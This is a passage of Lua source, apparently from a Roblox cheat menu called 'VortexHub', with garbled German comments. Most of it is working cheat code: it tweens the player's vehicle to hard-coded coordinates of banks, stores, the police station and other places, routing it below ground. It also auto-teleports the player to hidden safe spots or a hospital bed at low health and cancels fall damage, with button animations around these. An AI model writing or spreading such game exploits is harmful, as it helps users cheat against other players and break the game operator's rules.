		local plr = game.Players.LocalPlayer
		local car = workspace.Vehicles[plr.Name]
		car.PrimaryPart = car:FindFirstChild("DriveSeat",true)
		car.DriveSeat:Sit(plr.Character.Humanoid)
	
		if typeof(destination) == "CFrame" then
			destination = destination.Position
		end
	
		local startPosition = car.PrimaryPart.Position
		local highStart = startPosition + Vector3.new(0, -5, 0)
		local highDestination = destination + Vector3.new(0, -5, 0)
	
		local function moveTo(targetPosition)
			local distance = (car.PrimaryPart.Position - targetPosition).Magnitude
			local tweenDuration = distance / 175
	
			local TweenInfoToUse = TweenInfo.new(
				tweenDuration,
				Enum.EasingStyle.Linear,
				Enum.EasingDirection.Out
			)
	
			local TweenValue = Instance.new("CFrameValue")
			TweenValue.Value = car:GetPivot()
	
			TweenValue.Changed:Connect(function(newCFrame)
				car:PivotTo(newCFrame)
				car.DriveSeat.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
				car.DriveSeat.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
			end)
	
			local targetCFrame = CFrame.new(targetPosition)
			local tween = TweenService:Create(TweenValue, TweenInfoToUse, { Value = targetCFrame })
	
			tween:Play()
			tween.Completed:Wait()
			TweenValue:Destroy()
		end
	
		moveTo(highStart)
		moveTo(highDestination)
		moveTo(destination)
		return
	end
	
		local function teleportToNearestDealer()
			local player = game.Players.LocalPlayer
			local vehicle = workspace.Vehicles:FindFirstChild(player.Name)
	
			if not vehicle then
				warn("Teleport Error | Please spawn your vehicle before teleporting.")
				return
			end
	
			if vehicle.PrimaryPart == nil or not vehicle.PrimaryPart then
				vehicle.PrimaryPart = vehicle:FindFirstChild("Mass", true)
			end
	
			-- nd
			local closestDealer = nil
			local closestDistance = math.huge
	
			for _, dealer in pairs(workspace.Dealers:GetChildren()) do
				if dealer:IsA("Model") and dealer.PrimaryPart then
					local distance = (player.Character.PrimaryPart.Position - dealer.PrimaryPart.Position).Magnitude
					if distance < closestDistance then
						closestDistance = distance
						closestDealer = dealer
					end
				end
			end
	
			if not closestDealer then
				warn("Teleport Error | No dealer found in the workspace.")
				return
			end
	
			local dealerPosition = closestDealer.PrimaryPart.Position
			local dealerCFrame = closestDealer.PrimaryPart.CFrame
			local newVehicleCFrame = CFrame.new(dealerPosition - dealerCFrame.LookVector * -10, dealerPosition)
	
			tweenTo(newVehicleCFrame)
	
			local seat = vehicle:FindFirstChildWhichIsA("VehicleSeat", true)
			if seat then
				seat:Sit(player.Character.Humanoid)
			else
				warn("Teleport Error | No valid seat found in your vehicle.")
			end
	
			warn("Teleport Successful | You have been teleported to the nearest dealer.")
		end
	
	local function teleportTo(location)
		local location = getLocationCFrame(location)
		if location ~= "No" then
			VehiclesFolder:FindFirstChild(LocalPlayer.Name):FindFirstChild("DriveSeat", true):Sit(LocalPlayer.Character.Humanoid)
			task.wait()
				tweenTo(location)
		else
			print("No")
		end
	end
	
	script.Parent.MouseButton1Up:Connect(function()
		teleportToNearestDealer()
	end)
	
	
	
end
task.spawn(SCRIPT_156)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.Safe Zone.animation \\ --
local function SCRIPT_170()
local script = UI["170"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.01, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_170)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.Safe Zone.LocalScript \\ --
local function SCRIPT_173()
local script = UI["173"]
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local TweenService = game:GetService("TweenService")
	
	local VehiclesFolder = workspace:FindFirstChild("Vehicles")
	
	local function getLocationCFrame(location)
		if location == "Bank" then 
			return CFrame.new(-1174.68, 5.87, 3209.03)
		elseif location == "Safe Zone" then 
			return CFrame.new(709.764, 94.387, -657.761)
		elseif location == "Vehicle Garage" then 
			return CFrame.new(-95.965, 5.614, 453.769)
		elseif location == "Yellow Container" then 
			return CFrame.new(1178.71, 28.696, 2321.66)
		elseif location == "Green Container" then 
			return CFrame.new(1182.71, 28.696, 2158.84)
		elseif location == "Jewelry" then 
			return CFrame.new(-346.63, 5.87, 3572.74)
		elseif location == "Car Dealership" then 
			return CFrame.new(-1454.02, 5.615, 940.83)
		elseif location == "Ares Fuel" then 
			return CFrame.new(-870.86, 5.622, 1505.16)
		elseif location == "Gas n Go Fuel" then 
			return CFrame.new(-1544.4, 5.619, 3802.16)
		elseif location == "Ossu Fuel" then 
			return CFrame.new(-27.55, 5.622, -754.6)
		elseif location == "Hospital" then 
			return CFrame.new(-293.16, 5.627, 1053.98, -0.0149, 0.0017, 0.9999, 0.0001, 0.999998569, -0.0017, -0.999889, 0.0001, -0.0149)
		elseif location == "Prison" then 
			return CFrame.new(-514.34, 5.615, 2795.94)
		elseif location == "Police Station" then 
			return CFrame.new(-1658.55, 5.619, 2735.71)
		elseif location == "Night Club" then 
			return CFrame.new(-1844.95, 5.872, 3211.08)
		elseif location == "Fire Station" then 
			return CFrame.new(-963.32, 5.865, 3895.37, -0.0047, -2.09e-07, -0.99999, -4.25e-06, 1, -1.89e-07, 0.99999, 4.25e-06, -0.0047)
		elseif location == "Bus Company" then 
			return CFrame.new(-1695.80, 5.882, -1274.29, -0.9997, 7.07e-07, 0.0259, -6.75e-05, 0.999997, -0.0026, -0.0259, -0.0026, -0.9997)
		elseif location == "Truck Company" then 
			return CFrame.new(652.55, 5.638, 1510.85, 0.9981, -0.003, 0.0615, 0.0031, 0.999994, -0.0016, -0.0615, 0.0018, 0.9981)
		elseif location == "Tool Shop" then 
			return CFrame.new(-717.23, 5.654, 729.08, 0.9996, 4.71e-05, 0.0295, -5.32e-05, 1, 0.0002, -0.0295, -0.0002, 0.9996)
		elseif location == "Food Shop" then 
			return CFrame.new(-911.50, 5.371, -1169.20, 0.9999, 0.0001, -0.0147, -0.0001, 1, -0.0012, 0.0147, 0.0012, 0.9999)
		elseif location == "Clothing Store" then 
			return CFrame.new(479.05, 3.158, -1452.59, 0.0169, -0.0003, 0.99985, -0.000686, 0.9999, 0.000318, -0.999855, -0.000692, 0.0169544)
		else
			return "No"
		end
	end
	
	local function tweenTo(destination)
		local plr = game.Players.LocalPlayer
		local car = workspace.Vehicles[plr.Name]
		car.PrimaryPart = car:FindFirstChild("DriveSeat",true)
		car.DriveSeat:Sit(plr.Character.Humanoid)
	
		if typeof(destination) == "CFrame" then
			destination = destination.Position
		end
	
		local startPosition = car.PrimaryPart.Position
		local highStart = startPosition + Vector3.new(0, -5, 0)
		local highDestination = destination + Vector3.new(0, -5, 0)
	
		local function moveTo(targetPosition)
			local distance = (car.PrimaryPart.Position - targetPosition).Magnitude
			local tweenDuration = distance / 175
	
			local TweenInfoToUse = TweenInfo.new(
				tweenDuration,
				Enum.EasingStyle.Linear,
				Enum.EasingDirection.Out
			)
	
			local TweenValue = Instance.new("CFrameValue")
			TweenValue.Value = car:GetPivot()
	
			TweenValue.Changed:Connect(function(newCFrame)
				car:PivotTo(newCFrame)
				car.DriveSeat.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
				car.DriveSeat.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
			end)
	
			local targetCFrame = CFrame.new(targetPosition)
			local tween = TweenService:Create(TweenValue, TweenInfoToUse, { Value = targetCFrame })
	
			tween:Play()
			tween.Completed:Wait()
			TweenValue:Destroy()
		end
	
		moveTo(highStart)
		moveTo(highDestination)
		moveTo(destination)
		return
	end
	
	local function teleportTo(location)
		local location = getLocationCFrame(location)
		if location ~= "No" then
			VehiclesFolder:FindFirstChild(LocalPlayer.Name):FindFirstChild("DriveSeat", true):Sit(LocalPlayer.Character.Humanoid)
			task.wait()
			tweenTo(location)
		else
			print("No")
		end
	end
	
	script.Parent.MouseButton1Up:Connect(function()
		teleportTo("Safe Zone")
	end)
	
end
task.spawn(SCRIPT_173)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.LocalScript \\ --
local function SCRIPT_18e()
local script = UI["18e"]
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local TweenService = game:GetService("TweenService")
	
	local VehiclesFolder = workspace:FindFirstChild("Vehicles")
	
	local function getLocationCFrame(location)
		if location == "Bank" then 
			return CFrame.new(-1174.68, 5.87, 3209.03)
		elseif location == "Safe Zone" then 
			return CFrame.new(709.764, 94.387, -657.761)
		elseif location == "Vehicle Garage" then 
			return CFrame.new(-1436.22, 5.06, 154.26)
		elseif location == "Yellow Container" then 
			return CFrame.new(1178.71, 28.696, 2321.66)
		elseif location == "Green Container" then 
			return CFrame.new(1182.71, 28.696, 2158.84)
		elseif location == "Jewelry" then 
			return CFrame.new(-346.63, 5.87, 3572.74)
		elseif location == "Car Dealership" then 
			return CFrame.new(-1454.02, 5.615, 940.83)
		elseif location == "Ares Fuel" then 
			return CFrame.new(-870.86, 5.622, 1505.16)
		elseif location == "Gas n Go Fuel" then 
			return CFrame.new(-1544.4, 5.619, 3802.16)
		elseif location == "Ossu Fuel" then 
			return CFrame.new(-27.55, 5.622, -754.6)
		elseif location == "Hospital" then 
			return CFrame.new(-293.16, 5.627, 1053.98, -0.0149, 0.0017, 0.9999, 0.0001, 0.999998569, -0.0017, -0.999889, 0.0001, -0.0149)
		elseif location == "Prison" then 
			return CFrame.new(-514.34, 5.615, 2795.94)
		elseif location == "Police Station" then 
			return CFrame.new(-1658.55, 5.619, 2735.71)
		elseif location == "Night Club" then 
			return CFrame.new(-1844.95, 5.872, 3211.08)
		elseif location == "Fire Station" then 
			return CFrame.new(-963.32, 5.865, 3895.37, -0.0047, -2.09e-07, -0.99999, -4.25e-06, 1, -1.89e-07, 0.99999, 4.25e-06, -0.0047)
		elseif location == "Bus Company" then 
			return CFrame.new(-1695.80, 5.882, -1274.29, -0.9997, 7.07e-07, 0.0259, -6.75e-05, 0.999997, -0.0026, -0.0259, -0.0026, -0.9997)
		elseif location == "Truck Company" then 
			return CFrame.new(652.55, 5.638, 1510.85, 0.9981, -0.003, 0.0615, 0.0031, 0.999994, -0.0016, -0.0615, 0.0018, 0.9981)
		elseif location == "Tool Shop" then 
			return CFrame.new(-717.23, 5.654, 729.08, 0.9996, 4.71e-05, 0.0295, -5.32e-05, 1, 0.0002, -0.0295, -0.0002, 0.9996)
		elseif location == "Food Shop" then 
			return CFrame.new(-911.50, 5.371, -1169.20, 0.9999, 0.0001, -0.0147, -0.0001, 1, -0.0012, 0.0147, 0.0012, 0.9999)
		elseif location == "Clothing Store" then 
			return CFrame.new(479.05, 3.158, -1452.59, 0.0169, -0.0003, 0.99985, -0.000686, 0.9999, 0.000318, -0.999855, -0.000692, 0.0169544)
		else
			return "No"
		end
	end
	
	local function tweenTo(destination)
		local plr = game.Players.LocalPlayer
		local car = workspace.Vehicles[plr.Name]
		car.PrimaryPart = car:FindFirstChild("DriveSeat",true)
		car.DriveSeat:Sit(plr.Character.Humanoid)
	
		if typeof(destination) == "CFrame" then
			destination = destination.Position
		end
	
		local startPosition = car.PrimaryPart.Position
		local highStart = startPosition + Vector3.new(0, - 5, 0)
		local highDestination = destination + Vector3.new(0, - 5, 0)
	
		local function moveTo(targetPosition)
			local distance = (car.PrimaryPart.Position - targetPosition).Magnitude
			local tweenDuration = distance / 175
	
			local TweenInfoToUse = TweenInfo.new(
				tweenDuration,
				Enum.EasingStyle.Linear,
				Enum.EasingDirection.Out
			)
	
			local TweenValue = Instance.new("CFrameValue")
			TweenValue.Value = car:GetPivot()
	
			TweenValue.Changed:Connect(function(newCFrame)
				car:PivotTo(newCFrame)
				car.DriveSeat.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
				car.DriveSeat.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
			end)
	
			local targetCFrame = CFrame.new(targetPosition)
			local tween = TweenService:Create(TweenValue, TweenInfoToUse, { Value = targetCFrame })
	
			tween:Play()
			tween.Completed:Wait()
			TweenValue:Destroy()
		end
	
		moveTo(highStart)
		moveTo(highDestination)
		moveTo(destination)
		return
	end
	
	local function teleportTo(location)
		local location = getLocationCFrame(location)
		if location ~= "No" then
			VehiclesFolder:FindFirstChild(LocalPlayer.Name):FindFirstChild("DriveSeat", true):Sit(LocalPlayer.Character.Humanoid)
			task.wait()
			tweenTo(location)
		end
	end
	
	for i,v in pairs(script.Parent:GetChildren()) do
		if v:IsA("ScrollingFrame") then
			for _,q in pairs(v:GetChildren()) do
				if q:IsA("TextButton") then
					q.MouseButton1Up:Connect(function()
						teleportTo(q.Name)
					end)
				end
			end
		end
	end
	
	
	
end
task.spawn(SCRIPT_18e)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.1SelfRevive.LocalScript \\ --
local function SCRIPT_19c()
local script = UI["19c"]
	function Click(mouse)
	
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local TweenService = game:GetService("TweenService")
	local VehiclesFolder = workspace:FindFirstChild("Vehicles")
	
	-- Teleport-Funktion
	local function tweenTo(destination)
		local car = workspace.Vehicles[LocalPlayer.Name]
		if not car then return false end
	
		car.PrimaryPart = car:FindFirstChild("DriveSeat", true)
		if car.DriveSeat and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
			car.DriveSeat:Sit(LocalPlayer.Character.Humanoid)
		end
	
		if typeof(destination) == "CFrame" then
			destination = destination.Position
		end
	
		local function moveTo(targetPosition)
			local distance = (car.PrimaryPart.Position - targetPosition).Magnitude
			local tweenDuration = distance / 175
	
			local TweenInfoToUse = TweenInfo.new(
				tweenDuration,
				Enum.EasingStyle.Linear,
				Enum.EasingDirection.Out
			)
	
			local TweenValue = Instance.new("CFrameValue")
			TweenValue.Value = car:GetPivot()
	
			TweenValue.Changed:Connect(function(newCFrame)
				car:PivotTo(newCFrame)
				if car.DriveSeat then
					car.DriveSeat.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
					car.DriveSeat.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
				end
			end)
	
			local targetCFrame = CFrame.new(targetPosition)
			local tween = TweenService:Create(TweenValue, TweenInfoToUse, { Value = targetCFrame })
	
			tween:Play()
			tween.Completed:Wait()
			TweenValue:Destroy()
		end
	
		-- Hoch fliegen, dann zum Ziel
		moveTo(car.PrimaryPart.Position + Vector3.new(0, -4, 0))
		moveTo(destination + Vector3.new(0, -4, 0))
		moveTo(destination)
		return true
	end
	
	-- Hospital-System
	local function autoHealAndReturn(originalPosition)
		local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
		local humanoid = character:WaitForChild("Humanoid")
	
		-- Finde HospitalBed
		local hospitalBedSeat = workspace:FindFirstChild("Buildings") and 
			workspace.Buildings:FindFirstChild("Hospital") and 
			workspace.Buildings.Hospital:FindFirstChild("HospitalBed") and 
			workspace.Buildings.Hospital.HospitalBed:FindFirstChild("Seat")
	
		if not hospitalBedSeat then
			warn("Krankenhausbett nicht gefunden: Error 404 REPORT THIS TO VORTEXHUB DISCORD SERVER!")
			return false
		end
	
		-- Aus dem Fahrzeug aussteigen
		if humanoid.Sit then
			humanoid.Sit = false
			humanoid.Jump = true
			wait(0.1) -- Warte bis der Ausstieg abgeschlossen ist
		end
	
		-- Zum Bett teleportieren und sicherstellen, dass der Charakter bereit ist
		if character:FindFirstChild("HumanoidRootPart") then
			-- Position etwas Ã¼ber dem Sitz, damit der Charakter richtig fÃ¤llt
			character.HumanoidRootPart.CFrame = hospitalBedSeat.CFrame * CFrame.new(0, 3, 0)
			wait(0.1) -- Warte bis der Charakter stabil ist
	
			-- Setze die Geschwindigkeit zurÃ¼ck
			character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
			character.HumanoidRootPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
	
			-- Direkt Ã¼ber den Sitz positionieren
			character.HumanoidRootPart.CFrame = hospitalBedSeat.CFrame * CFrame.new(0, 0.5, 0)
			wait(0.1)
		end
	
		-- Versuche zu sitzen
		local sitAttempts = 0
		while not humanoid.Sit and sitAttempts < 5 do
			hospitalBedSeat:Sit(humanoid)
			sitAttempts += 1
			wait(0.1)
		end
	
		if humanoid.Sit then
			print(" ")
		else
			warn("Konnte nicht auf dem Krankenbett sitzen! Error 404 REPORT THIS TO VORTEXHUB DISCORD SERVER!")
			return false
		end
	
		-- Warte bis vollstÃ¤ndig geheilt
		repeat wait(0.1) until humanoid.Health >= humanoid.MaxHealth * 0.27
	
		-- Aufstehen
		humanoid.Sit = false
		humanoid.Jump = true
		wait(0.1)
	
		-- ZurÃ¼ck zum Fahrzeug
		local car = workspace.Vehicles[LocalPlayer.Name]
		if car and character:FindFirstChild("HumanoidRootPart") then
			character.HumanoidRootPart.CFrame = car.DriveSeat.CFrame * CFrame.new(0, 2, 0)
			car.DriveSeat:Sit(humanoid)
			wait(0.1)
			tweenTo(originalPosition)
			return true
		end
		return false
	end
	
	-- Hauptfunktion
	local function checkHealthAndTeleport()
		local car = workspace.Vehicles[LocalPlayer.Name]
		if not car then
			warn("Kein Fahrzeug gefunden! Error 404 REPORT THIS TO VORTEXHUB DISCORD SERVER!")
			return
		end
	
		local originalPosition = car:GetPivot().Position
		local targetCoordinates = CFrame.new(-120.30, 5.61, 1077.29)
		local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
		local humanoid = character:WaitForChild("Humanoid")
	
		-- Nur aktivieren wenn Gesundheit â‰¤27%
		if humanoid.Health <= (humanoid.MaxHealth * 0.27) then
			-- Zum Hospital teleportieren
			if tweenTo(targetCoordinates) then
				wait(2)
				autoHealAndReturn(originalPosition)
			end
		else
			game.StarterGui:SetCore("SendNotification", {
				Title = "VortexHub, Self Revive Information:",
				Text = "You are not dead â€“ no action required",
				Duration = 5
			})
		end
	end
	
	-- Automatische Ãœberwachung
	LocalPlayer.CharacterAdded:Connect(function(character)
		character:WaitForChild("Humanoid").HealthChanged:Connect(function()
			if character.Humanoid.Health <= (character.Humanoid.MaxHealth * 0.27) then
				checkHealthAndTeleport()
			end
		end)
	end)
	
	-- Initialcheck
	if LocalPlayer.Character then
		checkHealthAndTeleport()
	end
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_19c)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.1SelfRevive.animation \\ --
local function SCRIPT_19d()
local script = UI["19d"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_19d)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.1SelfRevive.Click Sound \\ --
local function SCRIPT_19f()
local script = UI["19f"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_19f)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.2AntiDying.LocalScript \\ --
local function SCRIPT_1a4()
local script = UI["1a4"]
	local Players = game:GetService("Players")
	local TweenService = game:GetService("TweenService")
	local LocalPlayer = Players.LocalPlayer
	local VehiclesFolder = workspace:WaitForChild("Vehicles")
	
	-- === Button direkt als Parent (du hast LocalScript im Button) ===
	local button = script.Parent
	
	-- === Toggle-Zustand ===
	local autoTeleportEnabled = false
	local hasTeleported = false
	
	-- === Button Text und Farben setzen ===
	button.Text = "Anti Dying: OFF"
	
	button.MouseButton1Click:Connect(function()
		autoTeleportEnabled = not autoTeleportEnabled
		if autoTeleportEnabled then
			button.Text = "Anti Dying: ON"
		else
			button.Text = "Anti Dying: OFF"
		end
	end)
	
	-- === Safe-Orte ===
	local locations = {
		["Save1 Bank"] = CFrame.new(-1234.35, 48.22, 3402.88),
		["Save2 Juwe"] = CFrame.new(-417.51, 53.33, 3262.16),
		["Save3 Kreis1"] = CFrame.new(-998.06, 47.09, 2800.54),
		["Save4 BrÃ¼cke"] = CFrame.new(-1098.41, -16.22, 1975.10),
		["Save5 Ares"] = CFrame.new(-878.87, 22.16, 1549.24),
		["Save6 Park"] = CFrame.new(-1594.95, 1.36, 1516.17),
		["Save4 aUTOHAUS"] = CFrame.new(-1428.87, 24.62, 1001.10),
		["Save4 Toolshop"] = CFrame.new(-716.36, 30.00, 621.49),
		["Save4 adac"] = CFrame.new(-250.76, 43.60, 725.22),
		["Save4 F3434"] = CFrame.new(-1444.65, 8.97, -443.39),
		["Save4 Hof"] = CFrame.new(-769.09, 26.86, -1329.42),
		["Save4 Clothing"] = CFrame.new(131.63, 44.76, -1835.22),
		["Save4 Hafen1"] = CFrame.new(516.02, 30.00, 2038.24),
		["Save4 Hafen2"] = CFrame.new(1006.57, 133.36, 2109.65),
		["Save4 Polizei"] = CFrame.new(-1654.44, 43.87, 2796.65),
		["Save4 PgAS AN GOO"] = CFrame.new(-1552.68, 24.90, 3770.43),
		["Save4 Stad1"] = CFrame.new(-1171.62, 73.61, 3579.50),
		["Save4 Fire"] = CFrame.new(-860.53, 54.24, 3869.08),
		["Save4 Erwins P Clup"] = CFrame.new(-1925.89, 73.62, 3186.97),
		["Save5 OSSO"] = CFrame.new(-147.25, 9.00, -373.07)
	}
	
	-- === Funktion: NÃ¤chster Ort
	local function getClosestLocation(pos)
		local closest, shortest = nil, math.huge
		for _, cf in pairs(locations) do
			local dist = (cf.Position - pos).Magnitude
			if dist < shortest then
				shortest = dist
				closest = cf
			end
		end
		return closest
	end
	
	-- === Tween Teleport Funktion
	local function tweenTo(destination)
		local car = VehiclesFolder:FindFirstChild(LocalPlayer.Name)
		if not car then return end
	
		local driveSeat = car:FindFirstChild("DriveSeat", true)
		if not driveSeat then return end
	
		car.PrimaryPart = driveSeat
		driveSeat:Sit(LocalPlayer.Character:WaitForChild("Humanoid"))
	
		if typeof(destination) == "CFrame" then
			destination = destination.Position
		end
	
		local function moveTo(target)
			local dist = (car.PrimaryPart.Position - target).Magnitude
			local time = dist / 175
			local info = TweenInfo.new(time, Enum.EasingStyle.Linear)
			local cfVal = Instance.new("CFrameValue")
			cfVal.Value = car:GetPivot()
	
			cfVal.Changed:Connect(function(cf)
				car:PivotTo(cf)
				driveSeat.AssemblyLinearVelocity = Vector3.zero
				driveSeat.AssemblyAngularVelocity = Vector3.zero
			end)
	
			local tween = TweenService:Create(cfVal, info, { Value = CFrame.new(target) })
			tween:Play()
			tween.Completed:Wait()
			cfVal:Destroy()
		end
	
		local start = car.PrimaryPart.Position
		moveTo(start + Vector3.new(0, -5, 0))
		moveTo(destination + Vector3.new(0, -5, 0))
		moveTo(destination)
	end
	
	-- === Health Ãœberwachen
	local function monitorHealth()
		local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
		local humanoid = character:WaitForChild("Humanoid")
	
		humanoid.HealthChanged:Connect(function(health)
			if autoTeleportEnabled and health <= 40 and not hasTeleported then
				hasTeleported = true
				local car = VehiclesFolder:FindFirstChild(LocalPlayer.Name)
				if car then
					local pos = car:GetPivot().Position
					local dest = getClosestLocation(pos)
					if dest then
						tweenTo(dest)
					end
				end
			elseif health > 40 then
				hasTeleported = false
			end
		end)
	end
	
	-- === Starten
	LocalPlayer.CharacterAdded:Connect(monitorHealth)
	if LocalPlayer.Character then
		monitorHealth()
	end
	
end
task.spawn(SCRIPT_1a4)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.2AntiDying.animation \\ --
local function SCRIPT_1a5()
local script = UI["1a5"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_1a5)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.2AntiDying.Click Sound \\ --
local function SCRIPT_1a7()
local script = UI["1a7"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_1a7)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.3AntiFall.LocalScript \\ --
local function SCRIPT_1ac()
local script = UI["1ac"]
	
	local button = script.Parent
	local antiFallActive = false
	local nofall
	local LocalPlayer = game.Players.LocalPlayer
	
	
	local function monitorFallDamage()
		if not nofall then
			nofall = game:GetService("RunService").RenderStepped:Connect(function()
				if LocalPlayer.Character.Humanoid.Sit == false then
					if workspace:Raycast(game.Players.LocalPlayer.Character.HumanoidRootPart.Position, Vector3.new(0, -20, 0)) then
						if workspace:Raycast(game.Players.LocalPlayer.Character.HumanoidRootPart.Position, Vector3.new(0, -20, 0)).Instance ~= nil and game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity.Y < -30 then 
							game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
						end
					end
				end
			end)
		end
	end
	
	local function deactivateAntiFall()
		if nofall then
			nofall:Disconnect()
			nofall = nil
		end
	end
	
	button.MouseButton1Click:Connect(function()
		antiFallActive = not antiFallActive  
	
		if antiFallActive then
			monitorFallDamage()
			button.Text = "Anti Fall Damage: ON"  
		else
			deactivateAntiFall()
			button.Text = "Anti Fall Damage: OFF"
		end
	end)
	
end
task.spawn(SCRIPT_1ac)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame1.3AntiFall.animation \\ --
local function SCRIPT_1ad()
local script = UI["1ad"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
